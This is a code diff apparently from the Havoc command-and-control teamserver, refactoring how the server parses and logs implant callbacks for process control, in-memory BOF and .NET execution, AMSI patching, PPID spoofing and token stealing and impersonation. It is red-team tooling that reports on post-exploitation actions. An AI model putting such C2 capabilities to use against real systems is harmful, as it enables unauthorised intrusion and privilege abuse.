-					  case win32.PAGE_EXECUTE_READ:
-					  	AllocateProtec = "PAGE_EXECUTE_READ"
-					  case win32.PAGE_EXECUTE_READWRITE:
-					  	AllocateProtec = "PAGE_EXECUTE_READWRITE"
-					  case win32.PAGE_EXECUTE_WRITECOPY:
-					  	AllocateProtec = "PAGE_EXECUTE_WRITECOPY"
-					  case win32.PAGE_GUARD:
-					  	AllocateProtec = "PAGE_GUARD"
-					  default:
-					  	AllocateProtec = strconv.Itoa(iProtect)
-					  }*/
-
-					collum = []string{BaseAddress, strconv.Itoa(iType), AllocateProtec, strconv.Itoa(iState), RegionSize}
-					tableData = append(tableData, collum)
-				}
-				table.AppendBulk(tableData)
-				table.Render()
-			}
-
-			if OutputBuffer.Len() > 0 {
-				Message["Type"] = "Info"
-				Message["Message"] = "List memory regions:"
-				Message["Output"] = "\n" + OutputBuffer.String()
-			} else {
-				Message["Type"] = "Error"
-				Message["Message"] = "Couldn't list memory regions"
-			}
-
-			break
-
-		case 7:
-
-			if Parser.Length() >= 4 {
-				var (
-					Success   = Parser.ParseInt32()
-					ProcessID = Parser.ParseInt32()
-				)
-
-				if Success == win32.TRUE {
-					Message["Type"] = "Good"
-					Message["Message"] = fmt.Sprintf("Successful killed process: %v", ProcessID)
 				} else {
 					Message["Type"] = "Error"
-					Message["Message"] = "Failed to kill process"
+					Message["Message"] = "Couldn't list loaded modules/dll from specified process: "
 				}
-			}
+				a.RequestCompleted(RequestID)
 
+				break
+
+			case DEMON_COMMAND_PROC_GREP:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_GREP", AgentID))
+				if Parser.Length() > 0 {
+					var (
+						ProcName  string
+						ProcID    int
+						ParentPID int
+						ProcUser  string
+						ProcArch  int
+
+						Output string
+					)
+
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32}) {
+						ProcName = Parser.ParseString()
+						ProcID = Parser.ParseInt32()
+						ParentPID = Parser.ParseInt32()
+						ProcUser = Parser.ParseString()
+						ProcArch = Parser.ParseInt32()
+
+						Output += fmt.Sprintf(
+							"\n   Process Name : %v\n   Process ID   : %v\n   Parent PID   : %v\n   Process User : %v\n   Process Arch : x%v\n",
+							ProcName, ProcID, ParentPID, ProcUser, ProcArch,
+						)
+					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = "Found one or more processes:"
+					Message["Output"] = Output
+
+				} else {
+					Message["Type"] = "Error"
+					Message["Message"] = "Couldn't find specified process"
+				}
+				a.RequestCompleted(RequestID)
+
+				break
+
+			case DEMON_COMMAND_PROC_CREATE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Path    = Parser.ParseUTF16String()
+						PID     = Parser.ParseInt32()
+						Success = Parser.ParseInt32()
+						Piped   = Parser.ParseInt32()
+						Verbose = Parser.ParseInt32()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_PROC_CREATE, Path: %s, PID: %d, Success: %d, Verbose: %d, Piped: %d", AgentID, Path, PID, Success, Verbose, Piped))
+
+					if Verbose == 1 {
+						if Success == 1 {
+							Message["Type"] = "Info"
+							Message["Message"] = fmt.Sprintf("Process started: Path:[%v] ProcessID:[%v]", Path, PID)
+						} else {
+							Message["Type"] = "Erro"
+							Message["Message"] = fmt.Sprintf("Process could not be started: Path:[%v]", Path)
+						}
+					}
+
+					if Success == 0 || Piped == 0 {
+						// if we don't expect to recieve output, then close the RequestID
+						a.RequestCompleted(RequestID)
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_CREATE, Invalid packet: %d", AgentID))
+				}
+
+				// TODO: can we expect more messages from this request?
+				//a.RequestCompleted(RequestID)
+
+				break
+
+			case 5: // Proc:BlockDll
+				// TODO: is this used?
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - 5", AgentID))
+					var (
+						BlockDll = int(Parser.ParseInt32())
+						State    = "disabled"
+					)
+
+					if BlockDll == 1 {
+						State = "enabled"
+					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = "Successfully " + State + " blockdll"
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - 5, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_PROC_MEMORY:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MEMORY", AgentID))
+					var (
+						BaseAddress    string
+						RegionSize     string
+						AllocateProtec string
+						// State 			string
+						// Type			string
+
+						iProtect int
+						iState   int
+						iType    int
+
+						_ = Parser.ParseInt32()
+						_ = Parser.ParseInt32()
+
+						OutputBuffer bytes.Buffer
+						tableData    [][]string
+					)
+
+					table := tablewriter.NewWriter(&OutputBuffer)
+
+					table.SetHeader([]string{"Base Address", "Type", "Protection", "State", "Region Size"})
+					table.SetBorder(false)
+					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
+					table.SetColumnAlignment([]int{tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_RIGHT})
+
+					table.SetRowSeparator("-")
+					table.SetColumnSeparator("│")
+					table.SetCenterSeparator("+")
+
+					for Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+						var (
+							collum []string
+						)
+
+						BaseAddress = "0x" + strconv.FormatInt(Parser.ParsePointer(), 16)
+						RegionSize = utils.ByteCountSI(int64(Parser.ParseInt32()))
+						iProtect = int(Parser.ParseInt32())
+						iState = int(Parser.ParseInt32())
+						iType = int(Parser.ParseInt32())
+
+						if Protection, ok := win32.Protections[iProtect]; !ok {
+							AllocateProtec = "UNKNOWN"
+						} else {
+							AllocateProtec = Protection[0]
+						}
+
+						/*switch iProtect {
+
+						  case win32.PAGE_NOACCESS:
+						  	AllocateProtec = "PAGE_NOACCESS"
+						  case win32.PAGE_READONLY:
+						  	AllocateProtec = "PAGE_READONLY"
+						  case win32.PAGE_READWRITE:
+						  	AllocateProtec = "PAGE_READWRITE"
+						  case win32.PAGE_WRITECOPY:
+						  	AllocateProtec = "PAGE_WRITECOPY"
+						  case win32.PAGE_EXECUTE:
+						  	AllocateProtec = "PAGE_EXECUTE"
+						  case win32.PAGE_EXECUTE_READ:
+						  	AllocateProtec = "PAGE_EXECUTE_READ"
+						  case win32.PAGE_EXECUTE_READWRITE:
+						  	AllocateProtec = "PAGE_EXECUTE_READWRITE"
+						  case win32.PAGE_EXECUTE_WRITECOPY:
+						  	AllocateProtec = "PAGE_EXECUTE_WRITECOPY"
+						  case win32.PAGE_GUARD:
+						  	AllocateProtec = "PAGE_GUARD"
+						  default:
+						  	AllocateProtec = strconv.Itoa(iProtect)
+						  }*/
+
+						collum = []string{BaseAddress, strconv.Itoa(iType), AllocateProtec, strconv.Itoa(iState), RegionSize}
+						tableData = append(tableData, collum)
+					}
+
+					table.AppendBulk(tableData)
+					table.Render()
+
+					if OutputBuffer.Len() > 0 {
+						Message["Type"] = "Info"
+						Message["Message"] = "List memory regions:"
+						Message["Output"] = "\n" + OutputBuffer.String()
+					} else {
+						Message["Type"] = "Error"
+						Message["Message"] = "Couldn't list memory regions"
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MEMORY, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_PROC_KILL:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Success   = Parser.ParseInt32()
+						ProcessID = Parser.ParseInt32()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_KILL, Success: %d, ProcessID: %d", AgentID, Success, ProcessID))
+
+					if Success == win32.TRUE {
+						Message["Type"] = "Good"
+						Message["Message"] = fmt.Sprintf("Successful killed process: %v", ProcessID)
+					} else {
+						Message["Type"] = "Error"
+						Message["Message"] = "Failed to kill process"
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_KILL, Invalid packet", AgentID))
+				}
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - UNKNOWN (%d)", AgentID, SubCommand))
+			}
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC, Invalid packet", AgentID))
 		}
 
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
@@ -2873,214 +3653,325 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 		)
 
 		switch Type {
-		case 0x0:
-			OutputMap["Output"] = string(Parser.ParseBytes())
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+		case CALLBACK_OUTPUT:
+			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_OUTPUT", AgentID))
+				OutputMap["Output"] = Parser.ParseString()
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			} else {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_OUTPUT, Invalid packet", AgentID))
+			}
 
 			break
 
-		case 0x90:
-			var String = Parser.ParseBytes()
-
-			OutputMap["Type"] = "Good"
-			OutputMap["Message"] = string(String)
-
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
-			break
-
-		case 0x91:
-			var String = Parser.ParseBytes()
-
-			OutputMap["Type"] = "Info"
-			OutputMap["Message"] = string(String)
-
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
-			break
-
-		case 0x92:
-			var String = Parser.ParseBytes()
-
-			OutputMap["Type"] = "Error"
-			OutputMap["Message"] = string(String)
-
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
-			break
-
-		case 0x98:
-			var (
-				Exception = Parser.ParseInt32()
-				Address   = Parser.ParseInt64()
-			)
-
-			OutputMap["Type"] = "Error"
-			OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
-
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
-			break
-
-		case 0x99:
-			var LibAndFunc = string(Parser.ParseBytes())
-			logger.Debug(hex.Dump(Parser.Buffer()))
-
-			OutputMap["Type"] = "Error"
-			OutputMap["Message"] = "Symbol not found: " + LibAndFunc
-
-			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+		case CALLBACK_ERROR:
+			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_ERROR", AgentID))
+				OutputMap["Type"] = "Error"
+				OutputMap["Output"] = Parser.ParseString()
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			} else {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_ERROR, Invalid packet", AgentID))
+			}
 
 			break
 
+		case COMMAND_INLINEEXECUTE_EXCEPTION:
+			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt64}) {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_EXCEPTION", AgentID))
+				var (
+					Exception = Parser.ParseInt32()
+					Address   = Parser.ParseInt64()
+				)
+
+				OutputMap["Type"] = "Error"
+				OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
+				a.RequestCompleted(RequestID)
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			} else {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_EXCEPTION, Invalid packet", AgentID))
+			}
+
+			break
+
+		case COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND:
+
+			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+				var LibAndFunc = Parser.ParseString()
+
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND, LibAndFunc: %s", AgentID, LibAndFunc))
+
+				OutputMap["Type"] = "Error"
+				OutputMap["Message"] = "Symbol not found: " + LibAndFunc
+				a.RequestCompleted(RequestID)
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			} else {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND, Invalid packet", AgentID))
+			}
+
+			break
+
+		case COMMAND_INLINEEXECUTE_RAN_OK:
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK", AgentID))
+
+			found := false
+			for i, BofCallback := range a.BofCallbacks {
+				if BofCallback.TaskID == RequestID {
+					// send the output back to the python module
+					OutputMap["Worked"] = "true"
+					OutputMap["Output"] = BofCallback.Output
+					OutputMap["TaskID"] = strings.ToUpper(fmt.Sprintf("%08x", RequestID))
+					teamserver.PythonModuleCallback(BofCallback.ClientID, a.NameID, HAVOC_BOF_CALLBACK, OutputMap)
+					a.BofCallbacks = append(a.BofCallbacks[:i], a.BofCallbacks[i+1:]...)
+					found = true
+					break
+				}
+			}
+
+			if found == false {
+				OutputMap["Type"] = "Info"
+				OutputMap["Message"] = "BOF execution completed"
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			}
+
+			a.RequestCompleted(RequestID)
+
+			break
+
+		case COMMAND_INLINEEXECUTE_COULD_NO_RUN:
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_COULD_NO_RUN", AgentID))
+
+			found := false
+			for i, BofCallback := range a.BofCallbacks {
+				if BofCallback.TaskID == RequestID {
+					// send the output back to the python module
+					OutputMap["Worked"] = "false"
+					OutputMap["Output"] = ""
+					OutputMap["TaskID"] = strings.ToUpper(fmt.Sprintf("%08x", RequestID))
+					teamserver.PythonModuleCallback(BofCallback.ClientID, a.NameID, HAVOC_BOF_CALLBACK, OutputMap)
+					a.BofCallbacks = append(a.BofCallbacks[:i], a.BofCallbacks[i+1:]...)
+					found = true
+					break
+				}
+			}
+
+			if found == false {
+				OutputMap["Type"] = "Error"
+				OutputMap["Message"] = "Failed to execute object file"
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			}
+
+			a.RequestCompleted(RequestID)
+
+			break
+
+		default:
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - UNKNOWN (%d)", AgentID, Type))
 		}
 
 	case COMMAND_ERROR:
-		var (
-			ErrorID = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
-
-		switch ErrorID {
-		case ERROR_WIN32_LASTERROR:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				ErrorCode          = Parser.ParseInt32()
-				ErrorString, found = Win32ErrorCodes[int(ErrorCode)]
+				ErrorID = Parser.ParseInt32()
+				Message = make(map[string]string)
 			)
 
-			ErrorString += " "
+			switch ErrorID {
+			case ERROR_WIN32_LASTERROR:
 
-			if !found {
-				ErrorString = ""
-			}
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					var (
+						ErrorCode          = Parser.ParseInt32()
+						ErrorString, found = Win32ErrorCodes[int(ErrorCode)]
+					)
 
-			Message["Type"] = "Error"
-			Message["Message"] = fmt.Sprintf("Win32 Error: %v [%v]", ErrorString, ErrorCode)
-			break
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_WIN32_LASTERROR, ErrorCode: %d", AgentID, ErrorCode))
 
-		case ERROR_COFFEXEC:
-			var (
-				Status = Parser.ParseInt32()
-			)
+					ErrorString += " "
 
-			Message["Type"] = "Error"
-			Message["Message"] = fmt.Sprintf("Failed to execute object file [%v]", Status)
-			break
+					if !found {
+						ErrorString = ""
+					}
 
-		case ERROR_TOKEN:
-			var Status = Parser.ParseInt32()
-
-			switch Status {
-			case 0x1:
-				Message["Type"] = "Error"
-				Message["Message"] = "No tokens inside the token vault"
+					Message["Type"] = "Error"
+					Message["Message"] = fmt.Sprintf("Win32 Error: %v [%v]", ErrorString, ErrorCode)
+					// TODO: can we expect more messages from this request?
+					//a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_WIN32_LASTERROR, Invalid packet", AgentID))
+				}
 				break
-			}
-		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			case ERROR_TOKEN:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					var Status = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_TOKEN, Status: %d", AgentID, Status))
+
+					switch Status {
+					case 0x1:
+						Message["Type"] = "Error"
+						Message["Message"] = "No tokens inside the token vault"
+						break
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_TOKEN, Invalid packet", AgentID))
+				}
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - UNKNOWN (%d)", AgentID, ErrorID))
+			}
+
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR, Invalid packet", AgentID))
+		}
 
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
-		var (
-			InfoID  = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
 
-		switch InfoID {
-		case DOTNET_INFO_AMSI_PATCHED:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				InfoID  = Parser.ParseInt32()
+				Message = make(map[string]string)
+			)
 
-			switch Parser.ParseInt32() {
-			case 0:
-				Message["Type"] = "Good"
-				Message["Message"] = "Successfully Patched Amsi"
+			switch InfoID {
+			case DOTNET_INFO_AMSI_PATCHED:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED", AgentID))
+
+					switch Parser.ParseInt32() {
+					case 0:
+						Message["Type"] = "Good"
+						Message["Message"] = "Successfully Patched Amsi"
+
+						break
+					case 1:
+						Message["Type"] = "Error"
+						Message["Message"] = "Failed to patch Amsi"
+
+						break
+					case 2:
+						Message["Type"] = "Info"
+						Message["Message"] = "Amsi already patched"
+
+						break
+					default:
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED, Invalid packet", AgentID))
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED, Invalid packet", AgentID))
+				}
 
 				break
-			case 1:
-				Message["Type"] = "Error"
-				Message["Message"] = "Failed to patch Amsi"
+
+			case DOTNET_INFO_NET_VERSION:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_NET_VERSION", AgentID))
+					Message["Type"] = "Info"
+					Message["Message"] = "Using CLR Version: " + Parser.ParseUTF16String()
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_NET_VERSION, Invalid packet", AgentID))
+				}
 
 				break
-			case 2:
-				Message["Type"] = "Info"
-				Message["Message"] = "Amsi already patched"
 
-				break
-			}
-			break
+			case DOTNET_INFO_ENTRYPOINT:
+				var ThreadID int
 
-		case DOTNET_INFO_NET_VERSION:
-			Message["Type"] = "Info"
-			Message["Message"] = "Using CLR Version: " + string(Parser.ParseBytes())
-			break
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					ThreadID = Parser.ParseInt32()
 
-		case DOTNET_INFO_ENTRYPOINT:
-			var ThreadID int
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_ENTRYPOINT, ThreadID: %d", AgentID, ThreadID))
 
-			if Parser.Length() >= 4 {
-				ThreadID = Parser.ParseInt32()
+					Message = map[string]string{
+						"Type":    "Good",
+						"Message": fmt.Sprintf("Assembly has been executed [Thread: %d]", ThreadID),
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_ENTRYPOINT, Invalid packet", AgentID))
+					Message = map[string]string{
+						"Type":    "Error",
+						"Message": fmt.Sprintf("Callback error: DOTNET_INFO_ENTRYPOINT (0x3) expects more or at least 4 bytes but received %d bytes.", Parser.Length()),
+					}
+				}
+
+			case DOTNET_INFO_FINISHED:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_FINISHED", AgentID))
+
 				Message = map[string]string{
 					"Type":    "Good",
-					"Message": fmt.Sprintf("Assembly has been executed [Thread: %d]", ThreadID),
+					"Message": "Finished executing assembly.",
 				}
-			} else {
+				a.RequestCompleted(RequestID)
+				break
+
+			case DOTNET_INFO_FAILED:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_FAILED", AgentID))
+
 				Message = map[string]string{
 					"Type":    "Error",
-					"Message": fmt.Sprintf("Callback error: DOTNET_INFO_ENTRYPOINT (0x3) expects more or at least 4 bytes but received %d bytes.", Parser.Length()),
+					"Message": "Failed to execute assembly or initialize the clr",
 				}
+				a.RequestCompleted(RequestID)
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - UNKNOWN (%d)", AgentID, InfoID))
 			}
 
-		case DOTNET_INFO_FINISHED:
-
-			Message = map[string]string{
-				"Type":    "Good",
-				"Message": "Finished executing assembly.",
-			}
-
-			break
-
-		case DOTNET_INFO_FAILED:
-
-			Message = map[string]string{
-				"Type":    "Error",
-				"Message": "Failed to execute assembly or initialize the clr",
-			}
-
-			break
-
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE, Invalid packet", AgentID))
 		}
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case COMMAND_ASSEMBLY_LIST_VERSIONS:
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_LIST_VERSIONS", AgentID))
 		var Output string
 		var Message = make(map[string]string)
 
-		for Parser.Length() != 0 {
-			Output += fmt.Sprintf("   - %v\n", string(Parser.ParseBytes()))
+		for Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+			Output += fmt.Sprintf("   - %v\n", Parser.ParseUTF16String())
 		}
 
 		Message["Type"] = typeInfo
 		Message["Message"] = "List available assembly versions:"
 		Message["Output"] = Output
-
+		a.RequestCompleted(RequestID)
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case COMMAND_PROC_PPIDSPOOF:
-		var (
-			Ppid    = int(Parser.ParseInt32())
-			Message = make(map[string]string)
-		)
 
-		Message["Type"] = typeGood
-		Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Ppid    = int(Parser.ParseInt32())
+				Message = make(map[string]string)
+			)
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_PPIDSPOOF, Ppid: %d", AgentID, Ppid))
+
+			Message["Type"] = typeGood
+			Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)
+
+			a.RequestCompleted(RequestID)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_PPIDSPOOF, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_TOKEN:
 
-		if Parser.Length() >= 4 {
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
 				SubCommand = Parser.ParseInt32()
 				Output     = make(map[string]string)
@@ -3088,35 +3979,53 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 			switch SubCommand {
 
-			case 0x1: // impersonate
-				var (
-					Successful = Parser.ParseInt32()
-					User       = Parser.ParseBytes()
-				)
+			case DEMON_COMMAND_TOKEN_IMPERSONATE:
 
-				if Successful == win32.TRUE {
-					Output["Type"] = typeGood
-					Output["Message"] = fmt.Sprintf("Successful impersonated %s", User)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						Successful = Parser.ParseInt32()
+						User       = Parser.ParseBytes()
+					)
+					
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_IMPERSONATE, Successful: %d, User: %s", AgentID, Successful, User))
+
+					if Successful == win32.TRUE {
+						Output["Type"] = typeGood
+						Output["Message"] = fmt.Sprintf("Successful impersonated %s", User)
+					} else {
+						Output["Type"] = typeError
+						Output["Message"] = fmt.Sprintf("Failed to impersonat %s", User)
+					}
+					a.RequestCompleted(RequestID)
 				} else {
-					Output["Type"] = typeError
-					Output["Message"] = fmt.Sprintf("Failed to impersonat %s", User)
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_IMPERSONATE, Invalid packet", AgentID))
 				}
 
 				break
 
-			case 0x2: // steal
-				var (
-					User      = string(Parser.ParseBytes())
-					TokenID   = Parser.ParseInt32()
-					TargetPID = Parser.ParseInt32()
-				)
+			case DEMON_COMMAND_TOKEN_STEAL:
 
-				Output["Type"] = "Good"
-				Output["Message"] = fmt.Sprintf("Successful stole token from %v User:[%v] TokenID:[%v]", TargetPID, User, TokenID)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						User      = Parser.ParseString()
+						TokenID   = Parser.ParseInt32()
+						TargetPID = Parser.ParseInt32()
+					)
+					// TODO: this should have a fail case
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_STEAL, User: %s, TokenID: %v, TargetPID: %v", AgentID, User, TokenID, TargetPID))
+
+					Output["Type"] = "Good"
+					Output["Message"] = fmt.Sprintf("Successful stole and impersonated token from %v User:[%v] TokenID:[%v]", TargetPID, User, TokenID)
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_STEAL, Invalid packet", AgentID))
+				}
 
 				break
 
-			case 0x3: // list
+			case DEMON_COMMAND_TOKEN_LIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_LIST", AgentID))
 				var (
 					Buffer    string
 					FmtString string
@@ -3124,30 +4033,29 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					MaxString int
 				)
 
-				for Parser.Length() != 0 {
+				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						TokenIndex    = Parser.ParseInt32()
 						Handle        = fmt.Sprintf("0x%x", Parser.ParseInt32())
-						DomainAndUser = string(Parser.ParseBytes())
+						DomainAndUser = Parser.ParseString()
 						ProcessID     = Parser.ParseInt32()
 						Type          = Parser.ParseInt32()
+						Impersonating = Parser.ParseInt32()
 					)
 
